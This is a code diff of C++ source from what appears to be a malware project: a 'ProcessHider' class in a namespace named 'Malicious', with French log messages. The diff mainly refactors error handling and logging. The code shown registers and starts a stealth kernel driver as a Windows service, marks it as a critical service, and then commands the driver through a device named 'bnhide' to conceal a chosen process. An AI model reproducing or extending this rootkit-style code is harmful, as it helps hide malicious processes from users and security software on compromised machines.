@@ -1,12 +1,7 @@
-//!
-//!     Kaleidoscalp, all rights reserved.
-//!
-
 #include "ProcessHider.hpp"
 #include "StealthDriver.hpp"
 #include "BinaryRessource.hpp"
 #include <system/System.hpp>
-#include <common/Convert.hpp>
 #include <common/Logger.hpp>
 
 #ifdef  _WIN32_IE
@@ -27,13 +22,16 @@ namespace Malicious
         wchar_t name[MAXLEN_NAME];
     } DATA_SURVEY, *PDATA_SURVEY;
     
-    ProcessHider::DriverError::DriverError()
+    ProcessHider::DriverError::DriverError(const std::string& argMsgError)
+		: Exception(argMsgError)
     {
-        SHOW_LAST_ERROR();
+        LOG_LAST_ERROR();
+		LOG << argMsgError;
     }
 
     ProcessHider::ProcessHider()
     {
+		LOG_THIS_FUNCTION
 		std::string windownPath;
 		System::getWindowsPath(windownPath);
         driverPath = windownPath + "\\" + SYS_DRIVER_FILENAME;
@@ -48,17 +46,18 @@ namespace Malicious
 
     ProcessHider::~ProcessHider()
     {
+		LOG_THIS_FUNCTION
         closeService();
         closeServiceManager();
     }
 
     void ProcessHider::hide(const std::string& processName)
     {
+		LOG_THIS_FUNCTION
         HANDLE hdev = CreateFile("\\\\.\\bnhide", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
         if(hdev == INVALID_HANDLE_VALUE)
         {
-            LOG << "Impossible de creer le fichier peripherique pour le driver.";
-            throw DriverError();
+            throw DriverError("Impossible de creer le fichier peripherique pour le driver.");
         }
 
         DATA_SURVEY dts;
@@ -79,21 +78,13 @@ namespace Malicious
 
         if(!b)
         {
-            d = GetLastError();
-            if(d)
-            {
-                LOG << to_string(d);
-            }
-            else
-            {
-                LOG << "Impossible de commander le driver.";
-                throw DriverError();
-            }
+			throw DriverError("Impossible de commander le driver.");
         }
     }
 
     void ProcessHider::remove()
     {
+		LOG_THIS_FUNCTION
         openServiceManager();
         openService();
         stopService();
@@ -103,66 +94,76 @@ namespace Malicious
 
     void ProcessHider::openServiceManager()
     {
+		LOG_THIS_FUNCTION
         manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
         if(!manager)
         {
-            LOG << "Impossible d'ouvrir le service manager.";
-            throw DriverError();
+            throw DriverError("Impossible d'ouvrir le service manager.");
         }
     }
     
     void ProcessHider::closeServiceManager()
     {
+		LOG_THIS_FUNCTION
         CloseServiceHandle(manager);
     }
 
     void ProcessHider::openService()
     {
+		LOG_THIS_FUNCTION
         service = OpenService(manager, sznamesys, SERVICE_ALL_ACCESS);
         if(!service)
         {
-            LOG << "Impossible d'ouvrir le service.";
-            throw DriverError();
+            throw DriverError("Impossible d'ouvrir le service.");
         }
     }
+
     void ProcessHider::closeService()
     {
+		LOG_THIS_FUNCTION
         CloseServiceHandle(service);
     }
+
     void ProcessHider::startService()
     {
-        service = CreateService(manager, sznamesys, sznamesys,
-                                SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
-                                SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, driverPath.c_str(),
-                                NULL, NULL, NULL, NULL, NULL);
+		LOG_THIS_FUNCTION
+        service = CreateService(
+			manager, 
+			sznamesys,
+			sznamesys,
+            SERVICE_ALL_ACCESS,
+			SERVICE_KERNEL_DRIVER,
+            SERVICE_DEMAND_START, 
+			SERVICE_ERROR_CRITICAL, //SERVICE_ERROR_NORMAL, 
+			driverPath.c_str(),
+            NULL, NULL, NULL, NULL, NULL);
         if(!service)
         {
-            closeServiceManager();
-            if(GetLastError() == ERROR_SERVICE_EXISTS)
+			DWORD lastError = GetLastError();
+            if(lastError == ERROR_SERVICE_EXISTS)
             {
                 LOG << "Le service existe deja.";
-                return;
+                openService();
             }
             else 
             {
-                LOG << "Impossible de creer le service.";
-                throw DriverError();
+                throw DriverError("Impossible de creer le service.");
             }
         }
         if(!StartService(service, 0, 0))
         {
-            LOG << "Impossible de demarrer le serice.";
-            throw DriverError();
+            throw DriverError("Impossible de demarrer le serice.");
         }
     }
+
     void ProcessHider::stopService()
     {
+		LOG_THIS_FUNCTION
         SERVICE_STATUS status;
         ControlService(service, SERVICE_CONTROL_STOP, &status);
         if(!DeleteService(service)) 
         {
-            LOG << "Impossible de stopper le service.";
-            throw DriverError();
+            throw DriverError("Impossible de stopper le service.");
         }
     }
 } // Malicious
